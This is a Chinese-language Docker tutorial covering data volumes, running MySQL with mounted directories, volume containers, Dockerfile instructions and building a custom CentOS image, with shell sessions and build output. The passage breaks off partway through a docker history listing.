<p>为了能保存数据在Docker中我们就可以使用卷！让数据挂载到我们本地！这样数据就不会因为容器删除</p>
<p>而丢失了！</p>
<p><strong>作用：</strong></p>
<p>卷就是目录或者文件，存在一个或者多个容器中，由docker挂载到容器，但不属于联合文件系统，因此</p>
<p>能够绕过 Union File System ， 提供一些用于持续存储或共享数据的特性</p>
<p>卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂</p>
<p>载的数据卷</p>
<p><strong>特点：</strong></p>
<ol>
<li>数据卷可在容器之间共享或重用数据</li>
<li>卷中的更改可以直接生效</li>
<li>数据卷中的更改不会包含在镜像的更新中</li>
<li>数据卷的生命周期一直持续到没有容器使用它为止</li>
</ol>
<p><strong>所以：总结一句话： 就是容器的持久化，以及容器间的继承和数据共享！</strong></p>
<h2 id="2、使用容器数据卷"><a href="#2、使用容器数据卷" class="headerlink" title="2、使用容器数据卷"></a>2、使用容器数据卷</h2><blockquote>
<p>方式一：容器中直接使用命令来添加</p>
</blockquote>
<p>挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">命令</span><br><span class="line"><span class="comment"># docker run -it -v 宿主机绝对路径目录:容器内目录 镜像名</span></span><br><span class="line">测试</span><br><span class="line"><span class="comment"># docker run -it -v /home/test:/home centos /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>查看数据卷是否挂载成功<code>docker inspect 容器id</code></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/2eba256a73aa2ce5c8c6877044c1f6d9--61d8--image-20240922162754059.png" alt="image-20240922162754059"></p>
<p>测试容器和宿主机之间数据共享：可以发现，在容器中，创建的会在宿主机中看到！</p>
<p>测试容器停止退出后，主机修改数据是否会同步！</p>
<ol>
<li>停止容器</li>
<li>在宿主机上修改文件</li>
<li>启动刚才停止的容器</li>
<li>然后查看对应的文件，发现数据依旧同步</li>
</ol>
<blockquote>
<p>实战：使用docker安装mysql</p>
</blockquote>
<p>思考：mysql 数据持久化的问题！</p>
<ol>
<li><p>下载镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull mysql:5.7</span></span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">20e4dcae4c69: Pull complete </span><br><span class="line">1c56c3d4ce74: Pull complete </span><br><span class="line">e9f03a1c24ce: Pull complete </span><br><span class="line">68c3898c2015: Pull complete </span><br><span class="line">6b95a940e7b6: Pull complete </span><br><span class="line">90986bb8de6e: Pull complete </span><br><span class="line">ae71319cb779: Pull complete </span><br><span class="line">ffc89e9dfd88: Pull complete </span><br><span class="line">43d05e938198: Pull complete </span><br><span class="line">064b2d298fba: Pull complete </span><br><span class="line">df9a4d85569b: Pull complete </span><br><span class="line">Digest: sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7	</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>可以成功同步对应的信息，使用mysql连接工具就可以变相直接控制docker内的数据库了</p>
</li>
</ol>
<p><code>docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</code>命名解释</p>
<p>这个命令使用 Docker 运行 MySQL 5.7 容器，并做出以下配置：</p>
<ul>
<li><code>-d</code> 表示容器在后台运行（即“守护进程”模式）。</li>
<li><code>-p 3310:3306</code> 将容器内的 MySQL 端口 3306 映射到主机的端口 3310 上，这样你就可以通过主机上的端口 3310 访问 MySQL 服务。</li>
<li><code>-v /home/mysql/conf:/etc/mysql/conf.d</code> 将主机上的目录 <code>/home/mysql/conf</code> 挂载到容器的 <code>/etc/mysql/conf.d</code> 目录中，这样你可以在主机上编辑 MySQL 配置文件，并且它们会在容器内生效。</li>
<li><code>-v /home/mysql/data:/var/lib/mysql</code> 将主机上的目录 <code>/home/mysql/data</code> 挂载到容器的 <code>/var/lib/mysql</code> 目录中，这样你可以在主机上保存 MySQL 数据文件，并且它们会在容器内生效。</li>
<li><code>-e MYSQL_ROOT_PASSWORD=123456</code> 设置 MySQL root 用户的密码为 <code>123456</code>。</li>
<li><code>--name mysql01</code> 指定容器的名称为 <code>mysql01</code>，以便于管理和查找。</li>
<li><code>mysql:5.7</code> 指定使用官方提供的 MySQL 5.7 镜像。</li>
</ul>
<p>这个命令的作用是在 Docker 中创建并运行一个 MySQL 容器，同时将主机上的目录挂载到容器中，以便于配置和保存数据。</p>
<h2 id="3、匿名和具名挂载"><a href="#3、匿名和具名挂载" class="headerlink" title="3、匿名和具名挂载"></a>3、匿名和具名挂载</h2><ul>
<li>-v 容器内路径         #匿名挂载</li>
<li>-v 卷名:容器内路径      #具名挂载</li>
<li>-v &#x2F;宿主机路径:容器内路径   #指定路径挂载</li>
</ul>
<h2 id="4、初识Dockerfile"><a href="#4、初识Dockerfile" class="headerlink" title="4、初识Dockerfile"></a>4、初识Dockerfile</h2><p>DockerFile 是用来构建Docker镜像的构建文件，是由一些列命令和参数构成的脚本。</p>
<p>我们在这里，先体验下，后面我们会详细讲解 DockerFile ！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.进入宿主机目录，在目录下再创建一个目录docker-test-volume，在这个新建目录下新建一个文件dockerfile</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test<span class="comment"># mkdir docker-test-volumn</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test<span class="comment"># cd docker-test-volumn/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.编辑dockerfile1这个文件</span></span><br><span class="line"><span class="comment">#说明：在编写DockerFile文件中使用 VOLUME 指令来给镜像添加一个或多个数据卷</span></span><br><span class="line"><span class="comment">#出于可移植和分享的考虑，我们之前使用的 -v 主机目录:容器目录 这种方式不能够直接在 DockerFile中实现</span></span><br><span class="line"><span class="comment">#由于宿主机目录是依赖于特定宿主机的，并不能够保证在所有宿主机上都存在这样的特定目录</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># vim dockerfile</span></span><br><span class="line">FROM centos</span><br><span class="line">VOLUME [<span class="string">&quot;volume1&quot;</span>,<span class="string">&quot;volume2&quot;</span>]</span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;-----end-----&quot;</span></span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.build后生成镜像，获得一个新镜像 my-centos</span></span><br><span class="line"><span class="comment">#注意最后有一个.</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker build -t my-centos .</span></span><br><span class="line">[+] Building 0.3s (5/5) FINISHED                                                                    docker:default</span><br><span class="line"> =&gt; [internal] load build definition from dockerfile                                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 123B                                                                          0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:latest                                              0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                             0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                               0.0s</span><br><span class="line"> =&gt; [1/1] FROM docker.io/library/centos:latest                                                                0.0s</span><br><span class="line"> =&gt; exporting to image                                                                                        0.0s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                       0.0s</span><br><span class="line"> =&gt; =&gt; writing image sha256:f0839ab2b921916360f89feb21d60cec317c13b76274d4c6de29d9d6bb404f52                  0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/my-centos                                                                  0.0s</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED             SIZE</span><br><span class="line">mytomcat     1.0       c4cc1b3de0ff   About an hour ago   474MB</span><br><span class="line">tomcat       latest    7f14c7d5cf60   4 days ago          469MB</span><br><span class="line">redis        latest    590b81f2fea1   7 weeks ago         117MB</span><br><span class="line">mysql        5.7       5107333e08a8   9 months ago        501MB</span><br><span class="line">my-centos    latest    f0839ab2b921   3 years ago         231MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago         231MB</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.启动容器 发现数据卷目录volume1和volume2</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker run -it f0839ab2b921 /bin/bash</span></span><br><span class="line">[root@20aafb95c23c /]<span class="comment"># ls</span></span><br><span class="line">bin  etc   lib	  lost+found  mnt  proc  run   srv  tmp  var	  volumn2</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr  volumn1</span><br><span class="line"><span class="comment">#5.进入容器，进入volume1目录，1.txt文件，然后退出容器</span></span><br><span class="line">[root@20aafb95c23c /]<span class="comment"># cd volumn1</span></span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># ls</span></span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># touch 1.txt</span></span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># ls</span></span><br><span class="line">1.txt</span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment">#问题:通过上述步骤，容器内的卷目录地址就已经知道了，但是对应的主机目录地址在哪里呢？</span></span><br><span class="line"><span class="comment">#6.查看容器信息</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE          COMMAND       CREATED              STATUS                      PORTS     NAMES</span><br><span class="line">20aafb95c23c   f0839ab2b921   <span class="string">&quot;/bin/bash&quot;</span>   About a minute ago   Exited (0) 23 seconds ago             busy_greider</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker inspect f0839ab2b921</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/25d8e823103f845e6a23f7221dc68d5a--07be--image-20240922170917802.png" alt="image-20240922170917802"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#8、发现宿主机文件</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># cd /var/lib/docker/volumes/5408b9e55fc0210903273841542b6fdb1cf0e3e1286994f19d08db8c78c6963b/_data</span></span><br><span class="line">root@VM-16-10-ubuntu:/var/lib/docker/volumes/5408b9e55fc0210903273841542b6fdb1cf0e3e1286994f19d08db8c78c6963b/_data<span class="comment"># ls</span></span><br><span class="line">1.txt</span><br></pre></td></tr></table></figure>

<p>注意：如果访问出现了 cannot open directory: Permission denied</p>
<p>解决办法：在挂载目录后多加一个 –privileged&#x3D;true参数即可</p>
<h2 id="5、数据卷容器"><a href="#5、数据卷容器" class="headerlink" title="5、数据卷容器"></a>5、数据卷容器</h2><p>命名的容器挂载数据卷，其他容器通过挂载这个（父容器）实现数据共享，挂载数据卷的容器，称之为</p>
<p>数据卷容器。</p>
<p>我们使用上一步的镜像：my-centos 为模板，运行容器 docker01，docker02，docker03，他</p>
<p>们都会具有容器卷volume1和volume2</p>
<p><strong>我们来测试下，容器间传递共享</strong></p>
<ol>
<li><p>用my-centos镜像，启动容器docker01，在volume2目录下新建一个文件from_docker01.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it --name docker01 my-centos</span></span><br><span class="line">[root@a31ad75c98e6 /]<span class="comment"># cd volume2</span></span><br><span class="line">[root@a31ad75c98e6 volume2]<span class="comment"># touch from_docker01.txt</span></span><br><span class="line">[root@a31ad75c98e6 volume2]<span class="comment"># ls</span></span><br><span class="line">from_docker01.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>退出不停止容器：ctrl+p+q</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root@VM-16-10-ubuntu:/home/ubuntu# docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE       COMMAND                  CREATED              STATUS              PORTS     NAMES</span><br><span class="line">a31ad75c98e6   my-centos   <span class="string">&quot;/bin/sh -c /bin/bash&quot;</span>   About a minute ago   Up About a minute             docker01</span><br></pre></td></tr></table></figure>
</li>
<li><p>用my-centos镜像，启动容器docker02，让docker02继承docker01  <code>--volumes-from</code></p>
<p>在volume2目录下新建一个文件from_docker02.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it --name docker02 --volumes-from docker01 my-centos</span></span><br><span class="line">[root@de7b3fc3cf53 /]<span class="comment"># cd volume2</span></span><br><span class="line">[root@de7b3fc3cf53 volume2]<span class="comment"># ls</span></span><br><span class="line">from_docker01.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止。</strong></p>
<p><strong>存储在本机的文件则会一直保留！</strong></p>
<h1 id="八、dockerfile"><a href="#八、dockerfile" class="headerlink" title="八、dockerfile"></a>八、dockerfile</h1><p>大家想想，Nginx，tomcat，mysql 这些镜像都是哪里来的？官方能写，我们不能写吗？</p>
<p>我们要研究自己如何做一个镜像，而且我们写的微服务项目以及springboot打包上云部署，Docker就是</p>
<p>最方便的。</p>
<p>微服务打包成镜像，任何装了Docker的地方，都可以下载使用，极其的方便。</p>
<p>流程：开发应用&#x3D;&gt;DockerFile&#x3D;&gt;打包为镜像&#x3D;&gt;上传到仓库（私有仓库，公有仓库）&#x3D;&gt; 下载镜像 &#x3D;&gt; 启动</p>
<p>运行。</p>
<p>还可以方便移植！</p>
<h2 id="1、什么是dockerfile"><a href="#1、什么是dockerfile" class="headerlink" title="1、什么是dockerfile"></a>1、什么是dockerfile</h2><p>dockerfifile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。</p>
<p>构建步骤：</p>
<ol>
<li>编写DockerFile文件</li>
<li>docker build 构建镜像</li>
<li>docker run</li>
</ol>
<p>dockerfifile文件我们刚才已经编写过了一次，这里我们继续使用 centos 来看！</p>
<p><a href="https://hub.docker.com/_/centos">https://hub.docker.com/_/centos</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/56b9338be70822d6aaca2a507ee2b04f--4fcc--image-20240922172857074.png" alt="image-20240922172857074"></p>
<h2 id="2、dockerfile的构建过程"><a href="#2、dockerfile的构建过程" class="headerlink" title="2、dockerfile的构建过程"></a>2、dockerfile的构建过程</h2><p><strong>基础知识</strong></p>
<ol>
<li>每条保留字指令都必须为大写字母且后面要跟随至少一个参数</li>
<li>指令按照从上到下，顺序执行</li>
<li># 表示注释</li>
<li>每条指令都会创建一个新的镜像层，并对镜像进行提交</li>
</ol>
<p><strong>流程：</strong></p>
<ol>
<li>docker从基础镜像运行一个容器</li>
<li>执行一条指令并对容器做出修改</li>
<li>执行类似 docker commit 的操作提交一个新的镜像层</li>
<li>Docker再基于刚提交的镜像运行一个新容器</li>
<li>执行dockerfifile中的下一条指令直到所有指令都执行完成！</li>
</ol>
<p><strong>说明：</strong></p>
<p>从应用软件的角度来看，DockerFile，docker镜像与docker容器分别代表软件的三个不同阶段。</p>
<ul>
<li>DockerFile 是软件的原材料 （代码）</li>
<li>Docker 镜像则是软件的交付品 （.apk）</li>
<li>Docker 容器则是软件的运行状态 （客户下载安装执行）</li>
</ul>
<p><strong>DockerFile 面向开发，Docker镜像成为交付标准，Docker容器则涉及部署与运维，三者缺一不可！</strong></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/f5913e68843f79d565a56a4ef914875c--d5b3--image-20240922173620477.png" alt="image-20240922173620477"></p>
<p>DockerFile：需要定义一个DockerFile，DockerFile定义了进程需要的一切东西。DockerFile涉及的内容</p>
<p>包括执行代码或者是文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版、服务进</p>
<p>程和内核进程（当引用进行需要和系统服务和内核进程打交道，这时需要考虑如何设计 namespace的权</p>
<p>限控制）等等。</p>
<p>Docker镜像：在DockerFile 定义了一个文件之后，Docker build 时会产生一个Docker镜像，当运行</p>
<p>Docker 镜像时，会真正开始提供服务；</p>
<p>Docker容器：容器是直接提供服务的。</p>
<h2 id="3、Dockerfile指令"><a href="#3、Dockerfile指令" class="headerlink" title="3、Dockerfile指令"></a>3、Dockerfile指令</h2><p>关键字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM        <span class="comment"># 基础镜像，当前新镜像是基于哪个镜像的</span></span><br><span class="line">MAINTAINER  <span class="comment"># maintainer 镜像维护者的姓名和邮箱地址</span></span><br><span class="line">RUN         <span class="comment"># 容器构建时需要运行的命令</span></span><br><span class="line">EXPOSE      <span class="comment"># 当前容器对外暴露出的端口</span></span><br><span class="line">WORKDIR	    <span class="comment"># 指定在创建容器后，终端默认登录进来的工作目录，一个落脚点</span></span><br><span class="line">ENV         <span class="comment"># 用来在构建镜像过程中设置环境变量</span></span><br><span class="line">ADD         <span class="comment"># 将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</span></span><br><span class="line">COPY        <span class="comment"># 类似ADD，拷贝文件和目录到镜像中！但是是不会自动解压文件，也不能访问网络资源</span></span><br><span class="line">VLIUME      <span class="comment"># 容器数据卷，用于数据保存和持久化工作</span></span><br><span class="line">CMD         <span class="comment"># 指定一个容器启动时要运行的命令，dockerFile中可以有多个CMD指令，但只有最 后一个生效！</span></span><br><span class="line">ENTRYPOINT  <span class="comment"># entrypoint 指定一个容器启动时要运行的命令！和CMD一样 可以追加命令</span></span><br><span class="line">ONBUILD     <span class="comment"># 当构建一个被继承的DockerFile时运行命令，父镜像在被子镜像继承后，父镜像的 ONBUILD被触发</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-23/b691757752d20b3ed9330eeecc587ec9--0eed--image-20240923190649837.png" alt="image-20240923190649837"></p>
<h2 id="4、实战测试"><a href="#4、实战测试" class="headerlink" title="4、实战测试"></a>4、实战测试</h2><p>Docker Hub 中99% 的镜像都是通过在base镜像（Scratch）中安装和配置需要的软件构建出来的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-23/d3d17cf58aff5777ea3ecad37eb764d4--fd02--image-20240923190944663.png" alt="image-20240923190944663"></p>
<blockquote>
<p>自定一个centos镜像</p>
</blockquote>
<ol>
<li><p>编写dockerfile</p>
<p>直接运行centos的官方镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker run -it centos /bin/bash</span></span><br><span class="line">Unable to find image <span class="string">&#x27;centos:latest&#x27;</span> locally</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">a1d0c7532777: Already exists </span><br><span class="line">Digest: sha256:a27fd8080b517143cbbbab9dfb7c8571c40d67d534bbdee55bd6c473f432b177</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:latest</span><br><span class="line">[root@bcf6eb6bf82f /]<span class="comment"># vim a</span></span><br><span class="line">bash: vim: <span class="built_in">command</span> not found</span><br><span class="line">[root@bcf6eb6bf82f /]<span class="comment"># ifconfig</span></span><br><span class="line">bash: ifconfig: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>发现，不支持vim和ifconfig命令，登陆后的默认路径是&#x2F;</p>
<p>目的：使我们自己的镜像具备如下：登陆后的默认路径、vim编辑器、查看网络配置ifconfifig支持</p>
<p>准备编写DockerFlie文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># vim mydockerfile-centos</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># cat mydockerfile-centos </span></span><br><span class="line">FROM centos</span><br><span class="line">MAINTATINER 6pc1&lt;pc6pc1@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span></span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum -y install vim</span><br><span class="line"></span><br><span class="line">RUN yun -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;----end------&quot;</span></span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>

<p>说明：dockerfile中直接<code>RUN yum -y install vim</code>可能会报下面错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#0 1.607 Error: Failed to download metadata for repo &#x27;appstream&#x27;: Cannot prepare internal mirrorlist: No URLs in mirrorlist</span></span><br></pre></td></tr></table></figure>

<p>说明下面这些，其实就是为了让<code>RUN yum -y install vim</code>可以执行成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN <span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum -y install vim</span><br></pre></td></tr></table></figure>
</li>
<li><p>构建</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker build -f mydockerfile-centos -t mycentos:1.0 .</span></span><br><span class="line">[+] Building 4.3s (11/11) FINISHED                                                                  docker:default</span><br><span class="line"> =&gt; [internal] load build definition from mydockerfile-centos                                                 0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 452B                                                                          0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:latest                                              0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                             0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                               0.0s</span><br><span class="line"> =&gt; [1/7] FROM docker.io/library/centos:latest                                                                0.0s</span><br><span class="line"> =&gt; CACHED [2/7] WORKDIR /usr/local                                                                           0.0s</span><br><span class="line"> =&gt; CACHED [3/7] RUN <span class="built_in">cd</span> /etc/yum.repos.d/                                                                     0.0s</span><br><span class="line"> =&gt; CACHED [4/7] RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*                            0.0s</span><br><span class="line"> =&gt; CACHED [5/7] RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum  0.0s</span><br><span class="line"> =&gt; CACHED [6/7] RUN yum -y install vim                                                                       0.0s</span><br><span class="line"> =&gt; [7/7] RUN yum -y install net-tools                                                                        3.4s</span><br><span class="line"> =&gt; exporting to image                                                                                        0.8s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                       0.8s</span><br><span class="line"> =&gt; =&gt; writing image sha256:c3dec9b6a3f811c4d5e5038392822da54ab5e069560708059a1f8bc636eca32d                  0.0s </span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/mycentos:1.0</span><br><span class="line"> root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE                                                        </span><br><span class="line">mycentos     1.0       c3dec9b6a3f8   30 seconds ago   312MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago      231MB</span><br></pre></td></tr></table></figure>

<p>命令：<code>docker build -f mydockerfile-centos -t mycentos:1.0 .</code>解释：</p>
<p>这是一个Docker命令，将使用指定的Dockerfile构建一个新的Docker镜像。</p>
<p>具体来说，该命令的各个部分的含义如下：</p>
<ul>
<li><code>docker build</code>：使用Docker命令构建新的镜像</li>
<li><code>-f mydockerfile-centos</code>：指定Dockerfile的名称为<code>mydockerfile-centos</code>。默认情况下，Docker使用当前目录下的名为<code>Dockerfile</code>的文件作为Dockerfile，但是在这里我们指定了一个不同的名称。</li>
<li><code>-t mycentos:1.0</code>：指定构建的镜像名称为<code>mycentos</code>，标签为<code>1.0</code>。标签可用于标识同一镜像的不同版本或变体。</li>
<li><code>.</code>：指定上下文路径，即构建过程中所使用的文件路径。这里的<code>.</code>表示使用当前目录作为上下文路径。</li>
</ul>
<p>因此，该命令的含义是使用<code>mydockerfile-centos</code>文件作为Dockerfile，将当前目录下的文件作为上下文构建一个名为<code>mycentos</code>、标签为<code>1.0</code>的新Docker镜像。</p>
</li>
<li><p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker run -it mycentos:1.0</span></span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># pwd</span></span><br><span class="line">/usr/local</span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 9  bytes 806 (806.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># vim a</span></span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># ls</span></span><br><span class="line">a  bin	etc  games  include  lib  lib64  libexec  sbin	share  src</span><br></pre></td></tr></table></figure>
</li>
<li><p>列出镜像的历史</p>
<p><strong>docker history 镜像id</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker history c3dec9b6a3f8</span></span><br><span class="line">IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT</span><br><span class="line">c3dec9b6a3f8   5 minutes ago   CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;/bin/bash&quot;</span>]                0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;echo \&quot;----end------\&quot;&quot;</span>]   0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;echo <span class="variable">$MYPATH</span>&quot;</span>]             0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   EXPOSE map[80/tcp:&#123;&#125;]                           0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   RUN /bin/sh -c yum -y install net-tools <span class="comment"># bu…   14.7MB    buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c yum -y install vim <span class="comment"># buildkit    66.3MB    buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c sed -i <span class="string">&#x27;s|#baseurl=http://mir…   8.8kB     buildkit.dockerfile.v0</span></span><br><span class="line"><span class="string">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c sed 